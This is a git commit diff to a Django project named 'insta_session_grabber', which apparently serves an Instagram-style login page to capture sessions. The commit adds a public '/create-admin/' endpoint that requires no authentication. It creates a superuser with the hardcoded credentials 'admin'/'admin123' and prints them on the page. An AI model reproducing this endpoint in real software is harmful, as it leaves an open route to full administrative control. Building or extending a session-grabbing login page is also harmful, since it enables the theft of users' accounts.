b67ea214cbff8962b876044e7c0e3456559ac3e3
Ankit-Sharma321 <ankitbk02052001@gmail.com>
2025-11-07 16:57:09 +0530

    FREE PLAN ADMIN CREATOR

--- insta_session_grabber/urls.py
+++ insta_session_grabber/urls.py
@@ -7,3 +7,15 @@ urlpatterns = [
     path('', views.login_view, name='login'),
     # path('checkpoint/', views.checkpoint_view, name='checkpoint'),
 ]
+
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def create_superuser_view(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@instagram.com', 'admin123')
+        return HttpResponse("<h1 style='color:green; text-align:center; margin-top:100px;'>ADMIN CREATED SUCCESSFULLY!<br><br>Username: admin<br>Password: admin123<br><br><a href='/admin' style='color:#0095f6; font-size:20px;'>Click here to go to Admin Panel</a></h1>")
+    return HttpResponse("<h1>Admin already exists! Go to <a href='/admin'>/admin</a></h1>")
+
+urlpatterns += [path('create-admin/', create_superuser_view)]
